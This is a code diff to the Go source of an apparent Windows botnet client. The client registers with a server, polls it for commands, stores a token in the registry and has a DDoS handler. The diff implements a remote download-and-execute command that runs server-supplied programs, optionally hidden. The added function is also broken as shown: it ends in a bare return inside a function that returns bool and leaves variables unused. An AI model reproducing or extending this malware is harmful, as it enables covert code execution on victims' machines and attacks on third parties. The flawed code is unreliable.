@@ -3,6 +3,7 @@ package components
 import (
 	"log"
 	"os"
+	"strings"
 	"time"
 
 	"golang.org/x/sys/windows/registry"
@@ -13,7 +14,25 @@ func do_register_bot(pkg *ServerReply, host string) bool {
 }
 
 func do_remote_download_execute(pkg *ServerReply, host string) bool {
-	return false
+	commandline := pkg.Args["args"]
+	strArgs := strings.Fields(commandline.(string))
+	option := ""
+
+	// Collect options if it exists
+	if len(strArgs) > 1 {
+		for i := 1; i < len(strArgs); i++ {
+			option += (strArgs[i] + " ")
+		}
+		option = strings.TrimSpace(option)
+	}
+	// Remote download and execute
+	ok := remote_execute(strArgs[0], pkg.Args["hidden"].(bool), option)
+
+	var reply ServerReply
+	reply.Args = make(map[string]any)
+	reply.Headers = make(map[string]string)
+
+	return
 }
 
 func do_ddos_attack(pkg *ServerReply, host string) bool {
@@ -59,6 +78,7 @@ func send_poll_request(host string) BotState {
 	if reply == nil || !check_package_legality(reply) {
 		return StateCommandPoll
 	}
+	reply.Cmd = strings.TrimSpace(reply.Cmd)
 
 	switch reply.Cmd {
 	case "register":
@@ -103,7 +123,6 @@ func auth_bot_poll(state BotState, host string) BotState {
 				break
 			}
 		}
-
 		next_state = StateGenGuid
 	case StateReadToken:
 		val := reg_read_key(registry.CURRENT_USER, g_regpath, "token", false)
